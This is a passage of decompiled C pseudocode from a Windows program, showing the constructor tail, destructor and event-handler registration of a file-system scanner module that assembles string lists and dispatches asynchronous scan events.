    sub_404640(v5, v47, (int)v46);
  }
  else
  {
    *(_DWORD *)(v47 + 16) = 0;
    *(_DWORD *)(v47 + 20) = 0;
    *(_OWORD *)v47 = *(_OWORD *)v46;
    *(_QWORD *)(v47 + 16) = *((_QWORD *)v46 + 2);
    v46[4] = 0;
    v46[5] = 7;
    *(_WORD *)v46 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 21;
  if ( v153 >= 8 )
  {
    v48 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v48 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v48 - 4) > 0x1F )
        goto LABEL_251;
    }
    sub_44775B(v48);
  }
  LOBYTE(v163) = 8;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v148 < 8 )
    goto LABEL_95;
  v49 = v147[0];
  if ( 2 * v148 + 2 >= 0x1000 )
  {
    v49 = (void *)*((_DWORD *)v147[0] - 1);
    if ( (unsigned int)(v147[0] - v49 - 4) > 0x1F )
LABEL_251:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v49);
LABEL_95:
  v50 = sub_40C780(&dword_4F99D0, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 23;
  v51 = sub_414750(v151, v50);
  LOBYTE(v163) = 24;
  v52 = v5[1];
  if ( v52 == v5[2] )
  {
    sub_404640(v5, v52, (int)v51);
  }
  else
  {
    *(_DWORD *)(v52 + 16) = 0;
    *(_DWORD *)(v52 + 20) = 0;
    *(_OWORD *)v52 = *(_OWORD *)v51;
    *(_QWORD *)(v52 + 16) = *((_QWORD *)v51 + 2);
    v51[4] = 0;
    v51[5] = 7;
    *(_WORD *)v51 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 23;
  if ( v153 >= 8 )
  {
    v53 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v53 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v53 - 4) > 0x1F )
        goto LABEL_252;
    }
    sub_44775B(v53);
  }
  LOBYTE(v163) = 8;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v148 < 8 )
    goto LABEL_106;
  v54 = v147[0];
  if ( 2 * v148 + 2 >= 0x1000 )
  {
    v54 = (void *)*((_DWORD *)v147[0] - 1);
    if ( (unsigned int)(v147[0] - v54 - 4) > 0x1F )
LABEL_252:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v54);
LABEL_106:
  v55 = sub_40C780(&dword_4F9B38, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 25;
  v56 = sub_414750(v151, v55);
  LOBYTE(v163) = 26;
  v57 = v5[1];
  if ( v57 == v5[2] )
  {
    sub_404640(v5, v57, (int)v56);
  }
  else
  {
    *(_DWORD *)(v57 + 16) = 0;
    *(_DWORD *)(v57 + 20) = 0;
    *(_OWORD *)v57 = *(_OWORD *)v56;
    *(_QWORD *)(v57 + 16) = *((_QWORD *)v56 + 2);
    v56[4] = 0;
    v56[5] = 7;
    *(_WORD *)v56 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 25;
  if ( v153 >= 8 )
  {
    v58 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v58 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v58 - 4) > 0x1F )
        goto LABEL_253;
    }
    sub_44775B(v58);
  }
  LOBYTE(v163) = 8;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v148 >= 8 )
  {
    v59 = v147[0];
    if ( 2 * v148 + 2 < 0x1000 || (v59 = (void *)*((_DWORD *)v147[0] - 1), (unsigned int)(v147[0] - v59 - 4) <= 0x1F) )
    {
      sub_44775B(v59);
      goto LABEL_117;
    }
LABEL_253:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_117:
  v60 = (_DWORD *)sub_40C780(&dword_4F9928, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 27;
  v61 = sub_40C780(&dword_4F99A0, (int)v143, (int)&savedregs);
  LOBYTE(v163) = 28;
  v62 = (char *)sub_414750(v151, v61);
  LOBYTE(v163) = 29;
  v63 = v60[4];
  v154 = *((_DWORD *)v62 + 4);
  if ( v63 <= *((_DWORD *)v62 + 5) - v154 || v60[5] - v63 < v154 )
  {
    if ( v60[5] >= 8u )
      v60 = (_DWORD *)*v60;
    v64 = sub_4044A0(v62, v60, v63);
  }
  else
  {
    if ( *((_DWORD *)v62 + 5) >= 8u )
      v62 = *(char **)v62;
    v64 = sub_40B080((char **)v60, (int)v62, v62, v154);
  }
  v65 = *(_OWORD *)v64;
  v66 = v64[2];
  *(_WORD *)v64 = 0;
  *((_DWORD *)v64 + 5) = 7;
  *((_DWORD *)v64 + 4) = 0;
  v150 = v66;
  *(_OWORD *)Block = v65;
  LOBYTE(v163) = 30;
  v67 = v5[1];
  if ( v67 == v5[2] )
  {
    sub_404640(v5, v67, (int)Block);
    v68 = HIDWORD(v150);
  }
  else
  {
    *(_OWORD *)v67 = v65;
    v68 = 7;
    *(_QWORD *)(v67 + 16) = v66;
    v5[1] += 24;
    LOWORD(Block[0]) = 0;
  }
  LOBYTE(v163) = 29;
  if ( v68 >= 8 )
  {
    v69 = Block[0];
    if ( 2 * v68 + 2 >= 0x1000 )
    {
      v69 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v69 - 4) > 0x1F )
        goto LABEL_254;
    }
    sub_44775B(v69);
  }
  LOBYTE(v163) = 28;
  if ( v153 >= 8 )
  {
    v70 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v70 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v70 - 4) > 0x1F )
        goto LABEL_254;
    }
    sub_44775B(v70);
  }
  LOBYTE(v163) = 27;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v145 >= 8 )
  {
    v71 = v143[0];
    if ( 2 * v145 + 2 >= 0x1000 )
    {
      v71 = (void *)*((_DWORD *)v143[0] - 1);
      if ( (unsigned int)(v143[0] - v71 - 4) > 0x1F )
        goto LABEL_254;
    }
    sub_44775B(v71);
  }
  LOBYTE(v163) = 8;
  v144 = 0;
  v145 = 7;
  LOWORD(v143[0]) = 0;
  if ( v148 < 8 )
    goto LABEL_144;
  v72 = v147[0];
  if ( 2 * v148 + 2 >= 0x1000 )
  {
    v72 = (void *)*((_DWORD *)v147[0] - 1);
    if ( (unsigned int)(v147[0] - v72 - 4) > 0x1F )
LABEL_254:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v72);
LABEL_144:
  v73 = sub_40C780(&dword_4F9BB0, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 31;
  v74 = sub_414750(v151, v73);
  LOBYTE(v163) = 32;
  v75 = v5[1];
  if ( v75 == v5[2] )
  {
    sub_404640(v5, v75, (int)v74);
  }
  else
  {
    *(_DWORD *)(v75 + 16) = 0;
    *(_DWORD *)(v75 + 20) = 0;
    *(_OWORD *)v75 = *(_OWORD *)v74;
    *(_QWORD *)(v75 + 16) = *((_QWORD *)v74 + 2);
    v74[4] = 0;
    v74[5] = 7;
    *(_WORD *)v74 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 31;
  if ( v153 >= 8 )
  {
    v76 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v76 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v76 - 4) > 0x1F )
        goto LABEL_255;
    }
    sub_44775B(v76);
  }
  LOBYTE(v163) = 8;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v148 < 8 )
    goto LABEL_155;
  v77 = v147[0];
  if ( 2 * v148 + 2 >= 0x1000 )
  {
    v77 = (void *)*((_DWORD *)v147[0] - 1);
    if ( (unsigned int)(v147[0] - v77 - 4) > 0x1F )
LABEL_255:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v77);
LABEL_155:
  v78 = sub_40C780(&dword_4F9C28, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 33;
  v79 = sub_414750(v151, v78);
  LOBYTE(v163) = 34;
  v80 = v5[1];
  if ( v80 == v5[2] )
  {
    sub_404640(v5, v80, (int)v79);
  }
  else
  {
    *(_DWORD *)(v80 + 16) = 0;
    *(_DWORD *)(v80 + 20) = 0;
    *(_OWORD *)v80 = *(_OWORD *)v79;
    *(_QWORD *)(v80 + 16) = *((_QWORD *)v79 + 2);
    v79[4] = 0;
    v79[5] = 7;
    *(_WORD *)v79 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 33;
  if ( v153 >= 8 )
  {
    v81 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v81 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v81 - 4) > 0x1F )
        goto LABEL_256;
    }
    sub_44775B(v81);
  }
  LOBYTE(v163) = 8;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v148 < 8 )
    goto LABEL_166;
  v82 = v147[0];
  if ( 2 * v148 + 2 >= 0x1000 )
  {
    v82 = (void *)*((_DWORD *)v147[0] - 1);
    if ( (unsigned int)(v147[0] - v82 - 4) > 0x1F )
LABEL_256:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v82);
LABEL_166:
  v83 = sub_40C780(&dword_4F9898, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 35;
  v84 = v5[1];
  if ( v84 == v5[2] )
  {
    sub_404640(v5, v84, v83);
  }
  else
  {
    *(_DWORD *)(v84 + 16) = 0;
    *(_DWORD *)(v84 + 20) = 0;
    *(_OWORD *)v84 = *(_OWORD *)v83;
    *(_QWORD *)(v84 + 16) = *(_QWORD *)(v83 + 16);
    *(_DWORD *)(v83 + 16) = 0;
    *(_DWORD *)(v83 + 20) = 7;
    *(_WORD *)v83 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 8;
  if ( v148 >= 8 )
  {
    v85 = v147[0];
    if ( 2 * v148 + 2 >= 0x1000 )
    {
      v85 = (void *)*((_DWORD *)v147[0] - 1);
      if ( (unsigned int)(v147[0] - v85 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v85);
  }
  v86 = sub_40C780(&dword_4F9A60, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 36;
  v87 = v5[1];
  if ( v87 == v5[2] )
  {
    sub_404640(v5, v87, v86);
  }
  else
  {
    *(_DWORD *)(v87 + 16) = 0;
    *(_DWORD *)(v87 + 20) = 0;
    *(_OWORD *)v87 = *(_OWORD *)v86;
    *(_QWORD *)(v87 + 16) = *(_QWORD *)(v86 + 16);
    *(_DWORD *)(v86 + 16) = 0;
    *(_DWORD *)(v86 + 20) = 7;
    *(_WORD *)v86 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 8;
  if ( v148 >= 8 )
  {
    v88 = v147[0];
    if ( 2 * v148 + 2 >= 0x1000 )
    {
      v88 = (void *)*((_DWORD *)v147[0] - 1);
      if ( (unsigned int)(v147[0] - v88 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v88);
  }
  v89 = sub_40C780(&dword_4F9BB0, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 37;
  v90 = v5[1];
  if ( v90 == v5[2] )
  {
    sub_404640(v5, v90, v89);
  }
  else
  {
    *(_DWORD *)(v90 + 16) = 0;
    *(_DWORD *)(v90 + 20) = 0;
    *(_OWORD *)v90 = *(_OWORD *)v89;
    *(_QWORD *)(v90 + 16) = *(_QWORD *)(v89 + 16);
    *(_DWORD *)(v89 + 16) = 0;
    *(_DWORD *)(v89 + 20) = 7;
    *(_WORD *)v89 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 8;
  if ( v148 >= 8 )
  {
    v91 = v147[0];
    if ( 2 * v148 + 2 >= 0x1000 )
    {
      v91 = (void *)*((_DWORD *)v147[0] - 1);
      if ( (unsigned int)(v147[0] - v91 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v91);
  }
  v92 = sub_40C780(&dword_4F9AD8, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 38;
  v93 = v5[1];
  if ( v93 == v5[2] )
  {
    sub_404640(v5, v93, v92);
  }
  else
  {
    *(_DWORD *)(v93 + 16) = 0;
    *(_DWORD *)(v93 + 20) = 0;
    *(_OWORD *)v93 = *(_OWORD *)v92;
    *(_QWORD *)(v93 + 16) = *(_QWORD *)(v92 + 16);
    *(_DWORD *)(v92 + 16) = 0;
    *(_DWORD *)(v92 + 20) = 7;
    *(_WORD *)v92 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 8;
  if ( v148 >= 8 )
  {
    v94 = v147[0];
    if ( 2 * v148 + 2 >= 0x1000 )
    {
      v94 = (void *)*((_DWORD *)v147[0] - 1);
      if ( (unsigned int)(v147[0] - v94 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v94);
  }
  v95 = sub_40C780(&dword_4F9A18, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 39;
  v96 = v5[1];
  if ( v96 == v5[2] )
  {
    sub_404640(v5, v96, v95);
  }
  else
  {
    *(_DWORD *)(v96 + 16) = 0;
    *(_DWORD *)(v96 + 20) = 0;
    *(_OWORD *)v96 = *(_OWORD *)v95;
    *(_QWORD *)(v96 + 16) = *(_QWORD *)(v95 + 16);
    *(_DWORD *)(v95 + 16) = 0;
    *(_DWORD *)(v95 + 20) = 7;
    *(_WORD *)v95 = 0;
    v5[1] += 24;
  }
  LOBYTE(v163) = 8;
  if ( v148 >= 8 )
  {
    v97 = v147[0];
    if ( 2 * v148 + 2 >= 0x1000 )
    {
      v97 = (void *)*((_DWORD *)v147[0] - 1);
      if ( (unsigned int)(v147[0] - v97 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v97);
  }
  v98 = (_DWORD *)sub_40C780(&dword_4F9B20, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 40;
  v99 = sub_40C780(&dword_4F9988, (int)v143, (int)&savedregs);
  LOBYTE(v163) = 41;
  v100 = (char *)sub_414750(v151, v99);
  LOBYTE(v163) = 42;
  v101 = v98[4];
  v154 = *((_DWORD *)v100 + 4);
  if ( v101 <= *((_DWORD *)v100 + 5) - v154 || v98[5] - v101 < v154 )
  {
    if ( v98[5] >= 8u )
      v98 = (_DWORD *)*v98;
    v102 = sub_4044A0(v100, v98, v101);
  }
  else
  {
    if ( *((_DWORD *)v100 + 5) >= 8u )
      v100 = *(char **)v100;
    v102 = sub_40B080((char **)v98, (int)v100, v100, v154);
  }
  v103 = *(_OWORD *)v102;
  v104 = v102[2];
  *(_WORD *)v102 = 0;
  *((_DWORD *)v102 + 5) = 7;
  *((_DWORD *)v102 + 4) = 0;
  v150 = v104;
  *(_OWORD *)Block = v103;
  LOBYTE(v163) = 43;
  v105 = v146;
  v106 = v146[13];
  if ( v106 == v146[14] )
  {
    sub_404640(v146 + 12, v106, (int)Block);
    v107 = HIDWORD(v150);
  }
  else
  {
    *(_OWORD *)v106 = v103;
    v107 = 7;
    *(_QWORD *)(v106 + 16) = v104;
    v105[13] += 24;
    LOWORD(Block[0]) = 0;
  }
  LOBYTE(v163) = 42;
  if ( v107 >= 8 )
  {
    v108 = Block[0];
    if ( 2 * v107 + 2 >= 0x1000 )
    {
      v108 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v108 - 4) > 0x1F )
        goto LABEL_262;
    }
    sub_44775B(v108);
  }
  LOBYTE(v163) = 41;
  if ( v153 >= 8 )
  {
    v109 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v109 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v109 - 4) > 0x1F )
        goto LABEL_262;
    }
    sub_44775B(v109);
  }
  LOBYTE(v163) = 40;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v145 >= 8 )
  {
    v110 = v143[0];
    if ( 2 * v145 + 2 >= 0x1000 )
    {
      v110 = (void *)*((_DWORD *)v143[0] - 1);
      if ( (unsigned int)(v143[0] - v110 - 4) > 0x1F )
        goto LABEL_262;
    }
    sub_44775B(v110);
  }
  LOBYTE(v163) = 8;
  v144 = 0;
  v145 = 7;
  LOWORD(v143[0]) = 0;
  if ( v148 >= 8 )
  {
    v111 = v147[0];
    if ( 2 * v148 + 2 < 0x1000 || (v111 = (void *)*((_DWORD *)v147[0] - 1), (unsigned int)(v147[0] - v111 - 4) <= 0x1F) )
    {
      sub_44775B(v111);
      goto LABEL_228;
    }
LABEL_262:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_228:
  v112 = (_DWORD *)sub_40C780(&dword_4F9958, (int)v143, (int)&savedregs);
  LOBYTE(v163) = 44;
  v113 = sub_40C780(&dword_4F9988, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 45;
  v114 = (char *)sub_414750(v151, v113);
  LOBYTE(v163) = 46;
  v115 = v112[4];
  v154 = *((_DWORD *)v114 + 4);
  if ( v115 <= *((_DWORD *)v114 + 5) - v154 || v112[5] - v115 < v154 )
  {
    if ( v112[5] >= 8u )
      v112 = (_DWORD *)*v112;
    v116 = sub_4044A0(v114, v112, v115);
  }
  else
  {
    if ( *((_DWORD *)v114 + 5) >= 8u )
      v114 = *(char **)v114;
    v116 = sub_40B080((char **)v112, (int)v114, v114, v154);
  }
  v117 = *(_OWORD *)v116;
  v118 = v116[2];
  *(_WORD *)v116 = 0;
  *((_DWORD *)v116 + 5) = 7;
  *((_DWORD *)v116 + 4) = 0;
  v150 = v118;
  *(_OWORD *)Block = v117;
  LOBYTE(v163) = 47;
  v119 = v146;
  v120 = v146[13];
  if ( v120 == v146[14] )
  {
    sub_404640(v146 + 12, v120, (int)Block);
    v121 = HIDWORD(v150);
  }
  else
  {
    *(_OWORD *)v120 = v117;
    v121 = 7;
    *(_QWORD *)(v120 + 16) = v118;
    v119[13] += 24;
    LOWORD(Block[0]) = 0;
  }
  LOBYTE(v163) = 46;
  if ( v121 >= 8 )
  {
    v122 = Block[0];
    if ( 2 * v121 + 2 >= 0x1000 )
    {
      v122 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v122 - 4) > 0x1F )
        goto LABEL_263;
    }
    sub_44775B(v122);
  }
  LOBYTE(v163) = 45;
  if ( v153 >= 8 )
  {
    v123 = v151[0];
    if ( 2 * v153 + 2 < 0x1000 || (v123 = (void *)*((_DWORD *)v151[0] - 1), (unsigned int)(v151[0] - v123 - 4) <= 0x1F) )
    {
      sub_44775B(v123);
      goto LABEL_247;
    }
LABEL_263:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_247:
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  sub_4040C0(v147);
  LOBYTE(v163) = 8;
  sub_4040C0(v143);
  v124 = (void *)sub_40C780(&dword_4F9970, (int)Block, (int)&savedregs);
  LOBYTE(v163) = 48;
  v125 = sub_40C780(&dword_4F9988, (int)v143, (int)&savedregs);
  LOBYTE(v163) = 49;
  v126 = (char *)sub_414750(v151, v125);
  LOBYTE(v163) = 50;
  v127 = sub_40D780((int)v147, v126, v124);
  LOBYTE(v163) = 51;
  sub_403D90(v146 + 12, v127);
  sub_4040C0(v147);
  sub_4040C0(v151);
  sub_4040C0(v143);
  LOBYTE(v163) = 8;
  sub_4040C0(Block);
  v128 = (void *)sub_40C780(&dword_4F9BC8, (int)Block, (int)&savedregs);
  LOBYTE(v163) = 52;
  v129 = sub_40C780(&dword_4F9988, (int)v143, (int)&savedregs);
  LOBYTE(v163) = 53;
  v130 = (char *)sub_414750(v151, v129);
  LOBYTE(v163) = 54;
  v131 = sub_40D780((int)v147, v130, v128);
  LOBYTE(v163) = 55;
  v132 = v146 + 12;
  sub_403D90(v146 + 12, v131);
  sub_4040C0(v147);
  sub_4040C0(v151);
  sub_4040C0(v143);
  sub_4040C0(Block);
  sub_416880(v5);
  sub_416880(v132);
  sub_414C60(v159, v133);
  LOBYTE(v163) = 56;
  v134 = v146;
  sub_40F8F0(v146, v135);
  sub_412160((unsigned int **)v134 + 15, &v160);
  sub_414D60(v161, v136);
  LOBYTE(v163) = 57;
  sub_40F8F0(v134, v137);
  sub_412160((unsigned int **)v134 + 18, &v162);
  sub_413190(v155, v138);
  LOBYTE(v163) = 58;
  sub_40F8F0(v134, v139);
  sub_412190((void **)v134 + 21, &v156);
  sub_414E60(v157, v140);
  LOBYTE(v163) = 59;
  sub_40F8F0(v134, v141);
  sub_412190((void **)v134 + 27, &v158);
  sub_416BE0(v134);
  sub_414EA0(v157);
  sub_4131D0(v155);
  sub_414DA0(v161);
  sub_414CA0(v159);
  sub_406F70(&a3);
  return v134;
}
// 416740: variable 'v133' is possibly undefined
// 416754: variable 'v135' is possibly undefined
// 416769: variable 'v136' is possibly undefined
// 416777: variable 'v137' is possibly undefined
// 41678F: variable 'v138' is possibly undefined
// 41679D: variable 'v139' is possibly undefined
// 4167B5: variable 'v140' is possibly undefined
// 4167C3: variable 'v141' is possibly undefined
// 4B1688: using guessed type void *ANFileSystemScannerModule::`vftable';
// 414FE0: using guessed type _DWORD var_48[4];
// 414FE0: using guessed type _DWORD var_2C[4];
// 414FE0: using guessed type _DWORD var_98[4];
// 414FE0: using guessed type _DWORD var_70[4];

//----- (00416880) --------------------------------------------------------
_QWORD *__stdcall sub_416880(_DWORD *a1)
{
  _QWORD *result; // eax
  _QWORD *v2; // edi
  _QWORD *v3; // ecx
  _QWORD *v4; // esi
  unsigned int v5; // ecx
  _DWORD *v6; // eax

  result = (_QWORD *)*a1;
  v2 = (_QWORD *)a1[1];
  if ( (_QWORD *)*a1 != v2 )
  {
    do
    {
      v3 = v2;
      if ( !*((_DWORD *)result + 4) )
      {
        v4 = result + 3;
        if ( result + 3 != v2 )
        {
          do
          {
            sub_405520((_DWORD *)v4 - 6, v4);
            v4 += 3;
          }
          while ( v4 != v2 );
          v2 = (_QWORD *)a1[1];
        }
        v5 = *((_DWORD *)v2 - 1);
        if ( v5 >= 8 )
        {
          v6 = (_DWORD *)*((_DWORD *)v2 - 6);
          if ( 2 * v5 + 2 >= 0x1000 )
          {
            if ( (unsigned int)v6 - *(v6 - 1) - 4 > 0x1F )
              _invalid_parameter_noinfo_noreturn();
            v6 = (_DWORD *)*(v6 - 1);
          }
          sub_44775B(v6);
        }
        *((_DWORD *)v2 - 2) = 0;
        *((_DWORD *)v2 - 1) = 7;
        *((_WORD *)v2 - 12) = 0;
        a1[1] -= 24;
        v3 = (_QWORD *)a1[1];
        result = (_QWORD *)*a1;
      }
      result += 3;
      v2 = v3;
    }
    while ( result != v3 );
  }
  return result;
}

//----- (00416930) --------------------------------------------------------
_DWORD *__thiscall sub_416930(_DWORD *Block, char a2)
{
  sub_416960(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00416960) --------------------------------------------------------
void __thiscall sub_416960(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  int v6; // ecx
  _DWORD *v7; // edi
  int v8; // ecx
  _DWORD *v9; // edi
  int v10; // ecx
  _DWORD *v11; // edi
  int v12; // ecx
  void *v13; // edi

  *this = &ANFileSystemScannerModule::`vftable';
  v2 = this[32];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[27];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_32;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[31] = 0;
  this[32] = 7;
  *((_WORD *)this + 54) = 0;
  v4 = this[26];
  if ( v4 >= 8 )
  {
    v5 = (_DWORD *)this[21];
    if ( 2 * v4 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        goto LABEL_32;
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_44775B(v5);
  }
  this[25] = 0;
  this[26] = 7;
  *((_WORD *)this + 42) = 0;
  v6 = this[18];
  if ( v6 )
  {
    sub_4047B0(v6, this[19]);
    v7 = (_DWORD *)this[18];
    if ( (unsigned int)(24 * ((this[20] - (int)v7) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v7 - *(v7 - 1) - 4 > 0x1F )
        goto LABEL_32;
      v7 = (_DWORD *)*(v7 - 1);
    }
    sub_44775B(v7);
    this[18] = 0;
    this[19] = 0;
    this[20] = 0;
  }
  v8 = this[15];
  if ( v8 )
  {
    sub_4047B0(v8, this[16]);
    v9 = (_DWORD *)this[15];
    if ( (unsigned int)(24 * ((this[17] - (int)v9) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v9 - *(v9 - 1) - 4 > 0x1F )
        goto LABEL_32;
      v9 = (_DWORD *)*(v9 - 1);
    }
    sub_44775B(v9);
    this[15] = 0;
    this[16] = 0;
    this[17] = 0;
  }
  v10 = this[12];
  if ( v10 )
  {
    sub_4047B0(v10, this[13]);
    v11 = (_DWORD *)this[12];
    if ( (unsigned int)(24 * ((this[14] - (int)v11) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v11 - *(v11 - 1) - 4 > 0x1F )
        goto LABEL_32;
      v11 = (_DWORD *)*(v11 - 1);
    }
    sub_44775B(v11);
    this[12] = 0;
    this[13] = 0;
    this[14] = 0;
  }
  v12 = this[9];
  if ( v12 )
  {
    sub_4047B0(v12, this[10]);
    v13 = (void *)this[9];
    if ( (unsigned int)(24 * ((this[11] - (int)v13) / 24)) < 0x1000 )
    {
LABEL_30:
      sub_44775B(v13);
      this[9] = 0;
      this[10] = 0;
      this[11] = 0;
      goto LABEL_31;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_30;
    }
LABEL_32:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_31:
  sub_417B20(this + 6);
  sub_40F840(this);
}
// 4B1688: using guessed type void *ANFileSystemScannerModule::`vftable';

//----- (00416BE0) --------------------------------------------------------
int __thiscall sub_416BE0(int *this)
{
  int result; // eax
  int v3[2]; // [esp+8h] [ebp-48h] BYREF
  int *v4; // [esp+10h] [ebp-40h]
  char v5; // [esp+17h] [ebp-39h]
  int v6[2]; // [esp+18h] [ebp-38h] BYREF
  char v7; // [esp+20h] [ebp-30h]
  int *v8; // [esp+24h] [ebp-2Ch]
  int *v9; // [esp+3Ch] [ebp-14h]
  int v10; // [esp+4Ch] [ebp-4h]

  v7 = v5;
  v6[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v6[1] = (int)sub_417130;
  v8 = this;
  v9 = v6;
  v10 = 0;
  sub_40FA20(this, 4, (int)v6);
  v3[0] = (int)sub_416D70;
  v4 = this;
  sub_417B90(v6, (int)v3);
  sub_40FA20(this, 5, (int)v6);
  v3[0] = (int)sub_416CB0;
  v4 = this;
  sub_417B90(v6, (int)v3);
  result = sub_40FA20(this, 34, (int)v6);
  if ( v9 )
    return (*(int (__stdcall **)(bool))(*v9 + 16))(v9 != v6);
  return result;
}
// 4B16A4: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00416CB0) --------------------------------------------------------
void __thiscall sub_416CB0(_DWORD *this, int a2)
{
  _DWORD *v3; // esi
  _DWORD *i; // edi
  _DWORD *v5; // eax
  _BYTE *v6; // ecx
  unsigned int v7; // edx
  _DWORD *v8[5]; // [esp-18h] [ebp-60h] BYREF
  unsigned int v9; // [esp-4h] [ebp-4Ch]
  void **v10; // [esp+10h] [ebp-38h] BYREF
  void *Block; // [esp+20h] [ebp-28h]
  unsigned int v12; // [esp+34h] [ebp-14h]
  int v13; // [esp+44h] [ebp-4h]

  v3 = (_DWORD *)this[12];
  for ( i = (_DWORD *)this[13]; v3 != i; v3 += 6 )
  {
    sub_4055B0(v8, v3);
    v5 = sub_414A20(&v10, 0, v8[0], (int)v8[1], (int)v8[2], (int)v8[3], (int)v8[4], v9);
    v13 = 0;
    sub_416D70(this, v5);
    v13 = -1;
    v10 = &ANEventScanFileSystemAsync::`vftable';
    if ( v12 >= 8 )
    {
      v6 = Block;
      v7 = 2 * v12 + 2;
      if ( v7 >= 0x1000 )
      {
        v6 = (_BYTE *)*((_DWORD *)Block - 1);
        v7 = 2 * v12 + 37;
        if ( (unsigned int)((_BYTE *)Block - v6 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v9 = v7;
      sub_44775B(v6);
    }
  }
}
// 4B1680: using guessed type void *ANEventScanFileSystemAsync::`vftable';

//----- (00416D70) --------------------------------------------------------
char __thiscall sub_416D70(_DWORD *this, void *a2)
{
  int v3; // eax
  unsigned int *v4; // esi
  int v5; // edi
  unsigned int *v6; // eax
  void *v7; // ecx
  void *v8; // esi
  int v9; // esi
  void (__stdcall ***v10)(int); // ecx
  void (__stdcall ***v11)(int); // ecx
  int v12; // eax
  _DWORD *v13; // ecx
  __int128 v14; // xmm0
  int v15; // eax
